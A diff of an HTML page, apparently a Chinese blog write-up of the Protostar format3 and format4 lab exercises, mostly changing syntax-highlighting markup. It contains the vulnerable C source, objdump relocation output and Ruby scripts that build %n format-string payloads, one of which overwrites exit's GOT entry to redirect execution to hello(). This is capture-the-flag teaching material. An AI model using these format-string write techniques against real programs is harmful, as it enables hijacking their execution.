+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf4\x96\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf5\x96\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf6\x96\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 68 = 56 + 12，这里的 12 是因为 target 已经有 12 bytes 了</span>
+</span></span><span style="display:flex;"><span>f4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%56x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%12$n&#34;</span> <span style="color:#75715e"># 但这里的 12 是因为上文提到 ABCD 出现在第 12 个参数</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 85 = 68 + 17</span>
+</span></span><span style="display:flex;"><span>f5 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%17x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%13$n&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 258 = 85 + 173</span>
+</span></span><span style="display:flex;"><span>f6 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%173x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%14$n&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># echo 使用单引号，避免把 %?$n 解析成变量</span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;-END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span>echo <span style="color:#e6db74">&#39;#{target}#{f4+f5+f6}&#39;</span> <span style="color:#f92672">|</span> <span style="color:#e6db74">/opt/</span>protostar<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>format3
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">END</span>
+</span></span><span style="display:flex;"><span>puts command
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">`</span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
 </span></span></code></pre></div><p><img src="/p/protostar_format_0-4/3.png"
 	width="1990"
 	height="492"
@@ -558,67 +565,67 @@ if (!doNotTrack) {
 </ul>
 <p>This level is at /opt/protostar/bin/format4</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">hello</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;code execution redirected! you win</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>  
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">vuln</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> target;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hello</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;code execution redirected! you win</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">512</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);  
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><hr>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp/format$ objdump -TR /opt/protostar/bin/format4
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/opt/protostar/bin/format4:     file format elf32-i386
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">DYNAMIC SYMBOL TABLE:
-</span></span><span class="line"><span class="cl"><span class="m">00000000</span>  w   D  *UND*	<span class="m">00000000</span>              __gmon_start__
-</span></span><span class="line"><span class="cl"><span class="m">00000000</span>      DF *UND*	<span class="m">00000000</span>  GLIBC_2.0   fgets
-</span></span><span class="line"><span class="cl"><span class="m">00000000</span>      DF *UND*	<span class="m">00000000</span>  GLIBC_2.0   __libc_start_main
-</span></span><span class="line"><span class="cl"><span class="m">00000000</span>      DF *UND*	<span class="m">00000000</span>  GLIBC_2.0   _exit
-</span></span><span class="line"><span class="cl"><span class="m">00000000</span>      DF *UND*	<span class="m">00000000</span>  GLIBC_2.0   <span class="nb">printf</span>
-</span></span><span class="line"><span class="cl"><span class="m">00000000</span>      DF *UND*	<span class="m">00000000</span>  GLIBC_2.0   puts
-</span></span><span class="line"><span class="cl"><span class="m">00000000</span>      DF *UND*	<span class="m">00000000</span>  GLIBC_2.0   <span class="nb">exit</span>
-</span></span><span class="line"><span class="cl">080485ec g    DO .rodata	<span class="m">00000004</span>  Base        _IO_stdin_used
-</span></span><span class="line"><span class="cl"><span class="m">08049730</span> g    DO .bss	<span class="m">00000004</span>  GLIBC_2.0   stdin
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">DYNAMIC RELOCATION RECORDS
-</span></span><span class="line"><span class="cl">OFFSET   TYPE              VALUE 
-</span></span><span class="line"><span class="cl">080496fc R_386_GLOB_DAT    __gmon_start__
-</span></span><span class="line"><span class="cl"><span class="m">08049730</span> R_386_COPY        stdin
-</span></span><span class="line"><span class="cl">0804970c R_386_JUMP_SLOT   __gmon_start__
-</span></span><span class="line"><span class="cl"><span class="m">08049710</span> R_386_JUMP_SLOT   fgets
-</span></span><span class="line"><span class="cl"><span class="m">08049714</span> R_386_JUMP_SLOT   __libc_start_main
-</span></span><span class="line"><span class="cl"><span class="m">08049718</span> R_386_JUMP_SLOT   _exit
-</span></span><span class="line"><span class="cl">0804971c R_386_JUMP_SLOT   <span class="nb">printf</span>
-</span></span><span class="line"><span class="cl"><span class="m">08049720</span> R_386_JUMP_SLOT   puts
-</span></span><span class="line"><span class="cl"><span class="m">08049724</span> R_386_JUMP_SLOT   <span class="nb">exit</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp/format$ objdump -TR /opt/protostar/bin/format4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/opt/protostar/bin/format4:     file format elf32-i386
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DYNAMIC SYMBOL TABLE:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  w   D  *UND*	<span style="color:#ae81ff">00000000</span>              __gmon_start__
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>      DF *UND*	<span style="color:#ae81ff">00000000</span>  GLIBC_2.0   fgets
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>      DF *UND*	<span style="color:#ae81ff">00000000</span>  GLIBC_2.0   __libc_start_main
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>      DF *UND*	<span style="color:#ae81ff">00000000</span>  GLIBC_2.0   _exit
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>      DF *UND*	<span style="color:#ae81ff">00000000</span>  GLIBC_2.0   printf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>      DF *UND*	<span style="color:#ae81ff">00000000</span>  GLIBC_2.0   puts
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>      DF *UND*	<span style="color:#ae81ff">00000000</span>  GLIBC_2.0   exit
+</span></span><span style="display:flex;"><span>080485ec g    DO .rodata	<span style="color:#ae81ff">00000004</span>  Base        _IO_stdin_used
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049730</span> g    DO .bss	<span style="color:#ae81ff">00000004</span>  GLIBC_2.0   stdin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DYNAMIC RELOCATION RECORDS
+</span></span><span style="display:flex;"><span>OFFSET   TYPE              VALUE 
+</span></span><span style="display:flex;"><span>080496fc R_386_GLOB_DAT    __gmon_start__
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049730</span> R_386_COPY        stdin
+</span></span><span style="display:flex;"><span>0804970c R_386_JUMP_SLOT   __gmon_start__
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049710</span> R_386_JUMP_SLOT   fgets
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049714</span> R_386_JUMP_SLOT   __libc_start_main
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049718</span> R_386_JUMP_SLOT   _exit
+</span></span><span style="display:flex;"><span>0804971c R_386_JUMP_SLOT   printf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049720</span> R_386_JUMP_SLOT   puts
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049724</span> R_386_JUMP_SLOT   exit
 </span></span></code></pre></div><p>DYNAMIC RELOCATION RECORDS 中，GLIBC <code>exit</code> 函数实际指向的地址是 <code>0x08049724</code></p>
 <p>所以目标就是在 <code>0x08049724</code> 写入 <code>void hello()</code> 的地址，也就是 <code>0x080484b4</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp/format$ /opt/protostar/bin/format4
-</span></span><span class="line"><span class="cl">ABCD%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x
-</span></span><span class="line"><span class="cl">ABCD00000200<span class="p">|</span>b7fd8420<span class="p">|</span>bffff5d4<span class="p">|</span>44434241<span class="p">|</span>78383025<span class="p">|</span>3830257c
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp/format$ /opt/protostar/bin/format4
+</span></span><span style="display:flex;"><span>ABCD%08x|%08x|%08x|%08x|%08x|%08x
+</span></span><span style="display:flex;"><span>ABCD00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c
 </span></span></code></pre></div><p>ABCD 出现在第 4 个参数</p>
 <p>接下来考虑一下如何写入 <code>0x080484b4</code> 这个值</p>
 <p>可以分为三步：</p>
@@ -627,28 +634,28 @@ if (!doNotTrack) {
 <li>因为第二个值只能大于第一个值，所以在 <code>0x08049725</code> 写入 <code>0x0484</code> 也就是十进制 1156</li>
 <li>因为第三个值只能大于第二个值，而 <code>0x08</code> 怎么看都小于 <code>0x0484</code>，所以可以写入 <code>0x0508</code>。<code>05</code> 是随便的一个数字，目标仅仅只是让整个值大于第二个。同时我们并不关心这里的 <code>0x05</code> 到底被写哪去了，我们只需要使 <code>0x08049727</code> 这个 byte 上确实是 <code>0x08</code> 就可以了。以及 <code>0x0508</code> 的十进制是 1288</li>
 </ol>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;\x24\x97\x04\x08&#39;</span> <span class="o">+</span> <span class="s1">&#39;\x25\x97\x04\x08&#39;</span> <span class="o">+</span> <span class="s1">&#39;\x27\x97\x04\x08&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 180 = 168 + 12：target 已经是 12 bytes 了</span>
-</span></span><span class="line"><span class="cl"><span class="n">h24</span> <span class="o">=</span> <span class="s2">&#34;%168x&#34;</span> <span class="o">+</span> <span class="s2">&#34;%4$n&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 1156 = 976 + 180</span>
-</span></span><span class="line"><span class="cl"><span class="n">h25</span> <span class="o">=</span> <span class="s2">&#34;%976x&#34;</span> <span class="o">+</span> <span class="s2">&#34;%5$n&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 1288 = 1156 + 132</span>
-</span></span><span class="line"><span class="cl"><span class="n">h27</span> <span class="o">=</span> <span class="s2">&#34;%132x&#34;</span> <span class="o">+</span> <span class="s2">&#34;%6$n&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s">&lt;&lt;-END
-</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="n">ruby</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;puts &#34;#{target}#{h24+h25+h27}&#34;&#39;</span> <span class="o">|</span> <span class="sr">/opt/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">format4</span>
-</span></span><span class="line"><span class="cl"><span class="k">END</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">command</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\x24\x97\x04\x08&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x25\x97\x04\x08&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x27\x97\x04\x08&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 180 = 168 + 12：target 已经是 12 bytes 了</span>
+</span></span><span style="display:flex;"><span>h24 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%168x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%4$n&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1156 = 976 + 180</span>
+</span></span><span style="display:flex;"><span>h25 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%976x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%5$n&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1288 = 1156 + 132</span>
+</span></span><span style="display:flex;"><span>h27 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%132x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%6$n&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;-END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span>ruby <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;puts &#34;#{target}#{h24+h25+h27}&#34;&#39;</span> <span style="color:#f92672">|</span> <span style="color:#e6db74">/opt/</span>protostar<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>format4
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">END</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts command
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system(command)
 </span></span></code></pre></div><p>这里有个很奇怪的问题，也就是 <code>target</code> 中的 <code>\x27</code> 对应着 ASCII 中的单引号，结果会让 <code>echo</code> 以为语句已经结束了&hellip;</p>
 <p>解决办法姑且是换成 <code>ruby -e</code></p>
 <p>但还有个很奇怪的问题，如果要执行的语句里含有 <code>ruby -e</code> 那么 <code>puts `#{command}` </code>是完全没有任何输出的&hellip;甚至可能没有执行</p>
 <p>所以只能换成 <code>system(command)</code> 了</p>
 <p>顺带一提 <code>puts `#{command}` </code> 的 Markdown 语法是</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">``puts <span class="sb">`#{command}`</span> ``
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>``puts <span style="color:#e6db74">`#{command}`</span> ``
 </span></span></code></pre></div><p><img src="/p/protostar_format_0-4/4.png"
 	width="1990"
 	height="888"
@@ -1022,14 +1029,14 @@ if (!doNotTrack) {
         
         <div class="widget--toc">
             <nav id="TableOfContents">
-  <ol>
+  <ul>
     <li><a href="#protostar">Protostar</a></li>
     <li><a href="#format-zero">Format Zero</a></li>
     <li><a href="#format-one">Format One</a></li>
     <li><a href="#format-two">Format Two</a></li>
     <li><a href="#format-three">Format Three</a></li>
     <li><a href="#format-four">Format Four</a></li>
-  </ol>
+  </ul>
 </nav>
         </div>
     </section>
